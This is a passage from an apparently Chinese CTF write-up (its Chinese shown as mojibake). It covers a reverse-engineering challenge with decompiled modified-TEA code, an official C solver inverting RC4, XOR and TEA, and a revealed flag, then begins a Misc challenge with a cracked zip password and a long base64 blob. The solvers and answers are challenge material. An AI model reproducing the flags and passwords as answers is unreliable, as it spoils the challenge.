<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401660</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+4Ch] [ebp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+50h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+54h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+6Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+74h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+78h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = a2 + <span class="number">116</span>;</span><br><span class="line">  v8 = a2 + <span class="number">116</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v5 = *(_DWORD *)(v8 + <span class="number">4</span> * i);</span><br><span class="line">    v4 = *(_DWORD *)(v8 + <span class="number">4</span> * i + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 -= <span class="number">559038737</span>;</span><br><span class="line">      v5 += (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span> + <span class="number">1</span>) + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v6 + v4) ^ (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span>)</span><br><span class="line">                                                                                       + <span class="number">16</span> * v4);</span><br><span class="line">      v4 += (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span> + <span class="number">3</span>) + (v5 &gt;&gt; <span class="number">5</span>)) ^ (v6 + v5) ^ (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span> + <span class="number">2</span>)</span><br><span class="line">                                                                                       + <span class="number">16</span> * v5);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">4</span> * i) = v5;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">4</span> * i + <span class="number">4</span>) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªé­”æ”¹çš„tea<br>æ‰€ä»¥ç¨‹åºå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œäº† RC4+xor+tea<br>æœ€åçš„check<br>å°†32ä¸ªå­—ç¬¦å†xorä¸€ä¸ªkeyæ•°ç»„åä¸¤ä¸¤ä¸€ç»„æ˜ å°„åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„ä¸Š å¹¶ä¸å·²çŸ¥(??????)çš„ä¸€ä¸ªäºŒç»´æ•°ç»„æ¯”è¾ƒcheck<br>æ•´ä¸ªé¢˜è¿˜æ˜¯å¾ˆä¸é”™çš„ åªæ˜¯ä¸ºä»€ä¹ˆæˆ‘å°±æ˜¯æ‰¾ä¸åˆ°â€å·²çŸ¥â€çš„äºŒç»´æ•°ç»„çš„å€¼å•Šâ€¦<br>è´´ä¸ªå®˜æ–¹exp(ç¡¬æ˜¯ä¸å‘Šè¯‰æˆ‘truemapæ˜¯å¤šå°‘å¯¹å§ğŸ˜„):<br>è¿™é‡Œexpå†™çš„æŒºå¥½çš„ ç”¨Cçš„ unsigned char å’Œ unsigned int çœå»äº†æ•°æ®ç±»å‹è½¬æ¢çš„éº»çƒ¦<br>è¿˜æœ‰å°±æ˜¯ä¸€ä¸ªå°ç»†èŠ‚ : teaé€†å‘çš„æ—¶å€™å¤–å±‚å¾ªç¯ä¹Ÿè¦å€’ç€å¾ªç¯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;dataFlag.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tea</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* str)</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Teaè§£å¯†ä¸­\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* box = (<span class="type">unsigned</span> <span class="type">int</span>*) str;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">6</span>; i &gt;= <span class="number">0</span>; i = i - <span class="number">2</span>)&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> k0 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span>], k1 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span> + <span class="number">1</span>],</span><br><span class="line">k2 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span> + <span class="number">2</span>], k3 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span> + <span class="number">3</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta=<span class="number">0xDEADBEEF</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l = box[i], r=box[i + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> ii = <span class="number">0</span>; ii &lt; <span class="number">32</span>; ii++)&#123;</span><br><span class="line">sum+=delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)&#123;</span><br><span class="line">r-=((l&lt;&lt;<span class="number">4</span>)+k2)^(l+sum)^((l&gt;&gt;<span class="number">5</span>)+k3);</span><br><span class="line">l-=((r&lt;&lt;<span class="number">4</span>)+k0)^(r+sum)^((r&gt;&gt;<span class="number">5</span>)+k1);</span><br><span class="line">sum-=delta;</span><br><span class="line">&#125;</span><br><span class="line">box[i] = l;</span><br><span class="line">box[i + <span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Teaè§£å¯†å®Œæ¯•\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">initST</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *S, <span class="type">unsigned</span> <span class="type">char</span> *T, <span class="type">unsigned</span> <span class="type">char</span> *K, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">S[i] = i;</span><br><span class="line">T[i] = K[i%len];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">initS</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *S, <span class="type">unsigned</span> <span class="type">char</span> *T)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0x00</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = (j + S[i] + T[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = S[j];</span><br><span class="line">S[j] = S[i];</span><br><span class="line">S[i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">initK</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *S, <span class="type">unsigned</span> <span class="type">char</span> *K, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0x00</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(r=<span class="number">0</span>; r&lt;len; r++)</span><br><span class="line">&#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = S[j];</span><br><span class="line">S[j] = S[i];</span><br><span class="line">S[i] = tmp;</span><br><span class="line">t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line">K[r] = S[t];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *K, <span class="type">unsigned</span> <span class="type">char</span> *M, <span class="type">unsigned</span> <span class="type">char</span> *E, <span class="type">int</span> len)</span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ans[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(ans, M,<span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">E[i] = (M[i] ^ K[i]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">E[i] = (M[i] ^ K[i] ^ ans[K[i] % i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4_ENC</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* enc)</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RC4è§£å¯†ä¸­\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> T[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> K[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> M[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* E = enc;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> C[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(S, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(S));</span><br><span class="line"><span class="built_in">memset</span>(T, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(T));</span><br><span class="line"><span class="built_in">memset</span>(K, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(K));</span><br><span class="line"><span class="built_in">memset</span>(C, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(C));</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)M, (<span class="type">char</span>*)E);</span><br><span class="line">itoa(<span class="number">20220222</span>, (<span class="type">char</span>*)K, <span class="number">8</span>);</span><br><span class="line">initST(S, T, K, <span class="built_in">strlen</span>((<span class="type">char</span>*)K));</span><br><span class="line">initS(S, T);</span><br><span class="line">initK(S, K, <span class="number">256</span>);</span><br><span class="line">RC4(K, M, E, <span class="number">32</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RC4è§£å¯†å®Œæ¯•\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> keyMap[] =</span><br><span class="line">&#123;<span class="number">241</span>,<span class="number">239</span>,<span class="number">97</span>,<span class="number">187</span>,<span class="number">201</span>,<span class="number">69</span>,<span class="number">87</span>,<span class="number">67</span>,<span class="number">54</span>,<span class="number">235</span>,<span class="number">195</span>,<span class="number">245</span>,<span class="number">97</span>,<span class="number">31</span>,<span class="number">224</span>,<span class="number">237</span>,<span class="number">95</span>,<span class="number">25</span>,<span class="number">195</span>,<span class="number">131</span>,<span class="number">11</span>,<span class="number">103</span>,<span class="number">9</span></span><br><span class="line"><span class="number">1</span>,<span class="number">68</span>,<span class="number">122</span>,<span class="number">157</span>,<span class="number">178</span>,<span class="number">126</span>,<span class="number">245</span>,<span class="number">181</span>,<span class="number">34</span>,<span class="number">101</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">300</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(TrueMap[i][j] == <span class="number">1</span>)&#123;</span><br><span class="line">enc[index++] = i;</span><br><span class="line">enc[index++] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">32</span>; i++)&#123;</span><br><span class="line">enc[i] ^= keyMap[i];</span><br><span class="line">&#125;</span><br><span class="line">Tea(enc);</span><br><span class="line">RC4_ENC(enc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,enc);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æœ€åç¬¬äºŒéƒ¨åˆ†flagçš„å€¼: b0fa99f5bbd8bcf85d029dfd3033de7f</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="xxx-ä¸‹é›ªäº†"><a href="#xxx-ä¸‹é›ªäº†" class="headerlink" title="xxx ä¸‹é›ªäº†"></a>xxx ä¸‹é›ªäº†</h2><p>å¯¹æˆ‘æ¥è¯´æŒºæ–°é¢–çš„<br>é¦–å…ˆæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…å¯†ç çˆ†ç ´ é¢˜ç›®ç»™äº†å­—å…¸ çˆ†å°±å®Œäº†<br>å¯†ç : blueSHARK666<br>ç„¶ååœ¨tip.txtæ‰¾åˆ°å¾ˆå¤§ä¸€ä¸²base64 å­¦åˆ°è¿™æ˜¯base64åµŒå¥— ä¸€ç›´è§£ è§£åˆ°æœ€åä¸€æ­¥å¾—åˆ°:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CIcTpGI3CjMSCTYFdoCTNIIXpIbXZ0ISCadICZI39IbSJYII2CMISxSnSjIE5YFmxaeISXNICSZTp0SmpIYSCXFXdIMGZTSmxacSCICIdTbIpSSmpCYSTXCXTFaFxqFm2IcISCNFNSSmZySmxaC2CIbDZIZCSTSDIadGIGFTdSZF0ESCIaYIZ0S30jZ2ZOY3CIIICGITdSMSS5FF5OSGJGImIIa2C2S3CZeIdICGpSZnB5I3S3b2FyI3djZIpXYICZeITFZmIjMF52SG2IF2YCaG9IbX00CDAIeGJSIT00M2JxIS0IS2dIbICXbXZSYTSIMITSa0NXZTpCSF53SmJFZT0IMIpXYFxac2dCbINNSXACSmxjeE20FX0FbGZYSTdoISTIaINIMSJXSm5OC2JIcETFbIF2YFCacmJESmIISnBFSmxaYF5IInSXbGZpFm5CeSCqQmCIMF5GC2CoaSJFSm9FSm0DFFxadGNIcE5IbIY2SIxob2C0InNCbGZaYT0IM2CCeGIjSTJTC2CIFFJZITpXbIC0CDJ3Z2dYaIZ0Mn0XIIxobFZIITSZIG0FSmCaeTTSImC0ZTS5CEZIS2YCQ30IMjIXSjIIdSZCbINSZnBaSTdIIFSyIX0XbTJOS3C3cTZSF3NOZTpTCTCOaSJZbDCISCSTSm23Z2NFcIdNZnByICJ4YSCIInZ0Z35XFTSINTCIF3CNZ2I4S203CTCCaIdCS2MxSTCIcTCFCIZNIEJXSjSxMIdGIXdXaF0aSTdIeTTII3CXS3CCY3C3aSCISjNIbXB0SG2IZFNIImIIMn0FIIx3bFSIIT0jZF5aSm24IIYyNSNFMSpICTCISmJYa0pFbIpyCI2OZ2p0aINNIEJYS2ZCYIExC0JNSIZYYmxIIITIaE9OZmC4SFCTa2CCFnpCMIpZYSCOZTNIITdSZT4TSGCaFmSIFTTSZTCoCIx3b2CXcECOZTp0SIx3SFJZNSBCa2p2CFCIZTdZOSdISECXSGxIQ2YyITT0IEpXYCJICI3yMF9CZTC0SF2IS2JIb2TIMSJDISdNeIdICIZSbIpoSITxFFNGSnIIa2ZYSm2IIICCMDS0ZCIXY3ZOSSCCaExIZ200FjIOcFIGSTdNMEpCSm2TYIMxITdCb3pQSmx3SITZInCTZTpyI3ZIaE2ZIT0IMnZ0SjI3IISIbIp0MXACISSac2CICnJPS2BOSjIJeICIY20NZTS5FFx3SGJIcITCaFZICDI3S2CFZTdNIEJSSm24IFIIIX0CbmxXFmxIaIpEITdjMIZCY3dIFT2GcITIZmQICDJISFECCI0SSGxCIICacT5IIT0NSCTYFmxIeT3IF39IMDISSIxoSmJYaDNSMGZPFTd3Z2pGCGT0M0BMSmTIeGQxCnZIa2pPSTdoSITFZndFMSpTCSZIS32Xe0TIbCSZSTC3c2NIaI00M3TxS3dCeIYxC0S0ZTpOYmx3b2dXdGICST24I30IaTJCaG9FSm0DYjI3S2dCdIZNSXAIS3dTa2YyI300Zm0SS3SaCIYIImIIMIZTFmxISFEydCIISEoIYCICeSNZCI0SSGxISmxaI2dGITCXbFCCCSdIMISCMCBFbFp0YTCISFIZInCCe3CCYCI3cFIGImTIZ20YS2dTYSMxC3dXIGZYYTSacTSqQCIIMSI4SF2TST2ZcEpSS2B0SjJGcmECaICTa2p0ITCaIFZICnZjZ35YFjJob2CZImpNSTJTSmC3IId0FT0Ia2p0STCIS2pGCmxIbEp6SjJCNIIGInJjI0BaS3F2cTCqI3CIS3pxSGxaS2JIcDCIa3J0SCI3IINZCIdSZF0FSIcxb2TIIX0CMF0IYXpGISC0eGCIM3pyCTC3ImEyFTZCMSpXCEdIIIJCeINSIEJ3S3CIF2YxITCNSmZqFT0CYSTFZ3CXZmZXSFCTIIJIIn0IZ20ZSCI3SFN0OS0XIEJMSXpGI2YxSnSFbGZpFjI3d2CCcECSMSJCS20oIGJYFTBSbXN4C3C3cTCCOSCNa2Y2ISSaF2dCZX0jZF0XCFCIaIpISCIIbIJCSmx3aSNIICJIbCB2CFCJeIpSCT0XZ2JQSmTxb2Yxb0N0ZCTIY3d4S2YydDB0bFYFSmx3SF2IcDNIMIpPFmxOcFJGCIdISC02S2CIZ2dCS3daIICIY3F2cIYII3CSZmZXSII5F32SNXpIMn0SY3C3NmJSQTSIM2JoITd4YSN0F30PSFxCYCNBd2dISmISMIZCSFCaIGJXaG0Ia35SS3CZeIS0dGCIa2B6SFCaaFIIM0dCSECXYCI3IIdIITCTZTpCY3CIaE2YQn0IS2Z0ISC3ZFJGaGCCZ2JQIICaIFSIIXTTIGZoCFZGZTSCe0dIMSoFFm5aSFExcIBSbX0PYCJOZ2p0bI0ISXBISm24F2MxIX0CIGxSYCIIIITZSCIjZTCCSIx3S2CIcE0IMjEISmIxZSJIaIdSSICFIICaIFNZNS0PSTpoYCBIISCGF3djbSI4I30ISIJ0F39IbG0DCmx3SSICdGTNS20YSCJTYIIIInZ0Zm0aSjNIaIYIInNObEp2I3COCmExcEpXS2Z0YjISeSJYcIJSSSpYIIxoFFIGCIdaZSpIFmxIITTSITd0S3T4FF53S2C6ZCBaZECZSjJ3ISNCZTN0eTCaSmTIeE50SnNXbTJIFjNISTZIIndTbGC2SF5OITCIcI0CMIpDSjAxIISZaISSIG0MIXp3Z2SyC3COS35pYCBINSCCcEdCSmxXSI0oIId0aITCbXZ0SjIIcTpGCmpIbIoISGxIC2dGInZSb0BaCFCCd2CFQX0IbFpISIx3SFSIITSXSTp0FCJIIIJZCICSZTpYITdTYF2ICI0jZIZaSjI3ISC0dGI0MFpSSmxIImEyFXpFSTp0STC3dE9XbE50MXBCSTZJMSFyZ3dCb35FY3doSTCICINIZTpySF2GF2CZcDBSbCEISCIaZTdIcIdIZSpyI3ZGFFMxC0SFbIxOCIx3ITdXdGICS2JCY3CIFFJSQnJFSSJ0STC3cTdICm0IaFIFISSaa2dGIXpSb3pXFjNONICqZmC3STJCYFdoC32ScDSIbGZ2FjIIS2ZFCmTCZXBCIIxoF2CIb0NIbmZIY3CaMI3ISCSXZ3pCYTZCS2YCQm0XSTp0STCIc2IIcE5SaCETSm2IZFEyF30IaFZSYTd4b2ZSaENSbIpTCFdIaT2EZT0SbCSCSjJ3c35IbIpSIG0MICIaSFMxcEdFbG0XYT0oNTCqIX0IMSp0FF5OaTJXeICCa2paCDIISTdCZmpSSCSGSSd4a2YySnNXa2CXYTZCNIS6ZmCIMSp2FmxIaSJFQTBIbCAxFCJJeIpGSTNSSSpISIC3F2dISnZ3Z2ZaSmCISTCCeG9ISTpCSFpOS32FaG0Ce3CXYF2OZ35ICG0Ta2S4SmxjeE50ZX0XaF0FYmI2SSTIFnNIMSJISF2GSSJIc00SbCSPSTCJeINZbICSIG0YSTZ3I2N0FjCZbGZoYCJ2MICGSmCIM35yCSC3aSJZcG9FSm0DSTCadGNIOITNSnBSIICaYSTIInZSb3CaYCJISIpIInNjbGZTCEdoFT2GICIXa2CCSCICeSJYaIZ0Mm0CSmTxF2CGSnIIaCTqCICIISTZI390S35GFFpOSFJFZXdCSEExFjI3IIIGaGTSZXBQSm2TYSMyCnNSbG0IFjBac2TZIndXSTJCSmpCIIJZbDNCMIp2SjIaNTCZaIdNa3CMSIpGaFZ0Z3dXaCSCYmC3NSYxF3COZTS5SIC3SGJZNS0CbGQTSTCadGSSImxIb0B6SjSxMIZIIXdNSIJXCSdoeTCFI3CjbF5SC2CIS2JYQjJIbXB0ISdOc2dFFTNSIEJYII2TI2dIInICa3JOFm2IIIYxaGC0bEpYYFCoSSC6SnCCMn00STC3dIJIaId0MI94Smp3NGEyZTdXa2pFS3S3IISqCTNjbIpYCSC3ST2IIjIIbX0XYSCJeIIGcIdIMTJSSXp3ImSGC0N0ZCSYFTS3FICCMCZ3MIZ0SF5IC2CXFTdFS2ZXCmxaIGSGCTdIb0B6ICBIb2CXZX0jZTC0Sm2IFIZCeGIjMXB0I3F2SIJScECIa3CCFCISeINYaI0SaCSCSjBoQ2YxbI0je3CYFm24ISpIaGCIS3pCYT0IST2FFXdIa3C0YFx3dINGcE5IMFoyS2CISmQyFX0Fb35CY3dIC2TCMI9SMST4SF2GSIJII30CMICZYFC3c35XOSSIMF0MSjBaa2d0F303ZFxOSm5CISCCMDIFMST5FF5ISmJ0eI0CbG0SCIxIcTdCdGpSZTp5S3cxb2FxI3CXbGxXYTZGM2CFZTp3MDICFmx3aSJScITIZTCZSCIIZFECbGpTa2pYSIdTd2NGa2dXbXZICSCIIIYyeGIIM3pSFTZCIICIcGIaSTpXYFx3c39ICGTCZFpYSjI3MGEyIX0XaFZpFTSIaISZSCIFMSpTCSCObGJGcDBaSIZ0STFxSFJECTdNbTJ6SmTxI2dIZnZ0ZmZXFT0CCSCFQmCIMF50FF5OSFJ0FT0CbXZTSGxac2pEQTpIMIYTSjIob2TIC3CjIEpIYTZGSICEZnNXST50I3CICTCFQTdISEp2SCJGZ32ICId0aCSISmx3bFSIbICXa2ZXSmCIeTTSImC0STpyFFCoS2JIIm0Ce3C0SjIIdSNIQTdSS3pQSmTIMSICS3dXb3paCCJoSIZIITdOSTS5CFdTS2SIcDISS20CSjJ3IIIIeICNZnB0ITCSeIYxcE0jZCSXCSSIaIYxITd0MFT4SFC3SId0aISCa2p0STCIdGSSCGpSZnBISSCob2FIMS0Sa3CXSnpId2CFQXdTZ35TYFC3aSCIICJIZTp0FF2IIIJYcGIIbI0IIS0IS2dICI0TZmZZCSF2IITZImIIM3pGCTCoSSYCFT0Fa2pyCDIIZTpGcId0MTJSSmp3d2QxInJNSIZXS3SaIITXd0dCZTCxFm53SISIcE0XaFZSSGIxZmN0OSdSSESTI3ZGCmQIMSCaZmZYFjJoSSCqQmCSM3C0ST03S2CIITTIbCETCFCZemNICI0Ib0AIITSaYSCZMXIZSECXCI5oaIpICIdIMIZCSF2IIIJZIXpIMSpXISCNeSZYbIS0MTJCIICad2Qxb0ZTZIZOCSCIeISXMFdXbIT2CSZIIGEyaE0ISEpTFjJOISIICE5IMFoySmpGYSTXF30Fa2pZFmx3C2CqZ3CCbIpYCSZCITCIbDSSMnZSSm23IGIGCIp0MXBoSIZGcFNIInZ3ZmZOSmxINSdZSmIIMSJTFmpaF2CIIT0FSCSCCGxaZSJIcGxIaCS5SjJCNSdGITCjZm0YSjNodTTqQXdTZT5GSmxOaSCIcIpIS2B0ISCOS2SYaI00M2JIIICacT5IbICXb35XCICaeSTFcENXbIpGSF5ISFIZITBCMn0ZYCIIdGI0eGTXZF0aSmpGaT50IXTCIGxXYmI2S2TCcCIXSmxySF53a32Ic00SbCI0S3d3ZFNIbISIbFTxSm2CeGNICISCbGZpSTC3NTCqQmICS3pCSG5ISGJSQm9CSEC2YjI3cTCCZTZNS2JCSI2TaFIGIXTTZm0SSnpGdTYxITpTS2CSCEF2FFJYaI0IZTCSYjI3IINFCTZSaCSXISdCMSCGa20XbE5XCICaZ2C0eINSM3pCYFCoSFIZbDZFSSp0STCOcTdCcINISnBYSm2IC2FIM00Xb3CFYCNIISCqQmICbIS5CFC3aIJFZnpSMnQTSTd3Z2dCaI0Ib0BySmp3C2JIC0JPSmZpSjJoSTYxITNFMFS2CS0OIGJZNSdCSEExISCacSJZCE9IbSJ5SmTxMGIGInJOSIZaCFCIeTYyeGIIaCSXSIx3aE2YQTTXa2CZSjIOSFNII39IaCSISjB3CT5IInZ3Z2BZCFZIIIdZSmCIZTpyYT0GS320FCBIbX0CYFx3dSpINF5IbXcxSFxIa2SxIXdNIEpPST0CS2ZXNI9NMSpxFFCTST2SNXTCSSpSYSC3cFNSbId0MFpSSCSxS2NGFnJXbFCCCI2oSSdXeGICMTI4SFxobIJ6bINFSTC2STCCeF5SdI0IM0BXSjSINSCIInNjZI0SYCIIYSpSCEdCZCTXI3F2aETIICIIaFQTYCJJeIdFFTNSa2BSIIx3b2dGbISIbmZYFm5CZ2dZI39IZTp2FICoITCIc0JCSTp0YF2OIIJICE5SbEpCS2CIZ2NCS3djZIxSY3docISCe0dISmZXSICTaF2XF30IMjSXYIx3dISICICSSECFSjBaImSXF3SZbIpOYCNCIIC0eG93MIZTFT0oaTSyaGIIbX02YFxIcSJZOS0IMDSSISS3c2FIMSCIa35XCSC3I2pSITd3ZTpCI3CIaIECQndIS2BDISCaZFJSCmIIemxyIIC3FFSIC0JSaT5YY3CIeSZIIm9IMDIxSmCoSFExcG0SbX0ZCEC3c2p0bI0IMmcySmC3NITIIXTSa2pPSmxIcTSCe0dFMIxSFm53CFJGcICSMI0SSCAxSFNGaIdNaTCQISd4I2JZNSd0ZTppFm5BeTdIImI3MST4SFxIaIJCFnBSMICTF2CacTpScE5IMIpJSmT2C2d0ZXpZbG0aSjNIMTpEZmCIMIZCFF24FFJIImIXSTC0YjJGIINZImpCZ20YSmpOF2YxFTdXbXZCCICIITC0eGI0ZCIISmxCS2JIc0CSSECaCFCIISNIaGTXZ3pFS2d4S2dZMXNIbTJIFnpIISSqQTdOZmC2YFdGIGJGcDBIS2QTSm23SSJIQTC0a2poIXp3Z2SxcE0SZ35YFTSIFICCM00OZTS4SI0oSId0aISIMGZSS2CIdGS0ZTdSZ205SjS2aFIIInNXbm0IYT0Zd2YICECIM350Y3CISFJIcISIbXZICFC3Z2CFCm0IbSJYSIZ3bFSIInICIG0XCII2eTdZaE9XZTpJFI5CSmJYaDJaS200STCGdIJCcE50eTYFSmTIMSQxIT0CaF0IYXpIS2TFZmICSnBISF2TST2IcDBSbX0TSGxadGZ6QTd0aF92S2CaSmSIInSFbIJpFjJoaICCcE9SM3C0SFCaIGJZc0NSbCICCIx3cTpSCISSZ2J0SCJTc2YyZXTSaTpSSmxISIT6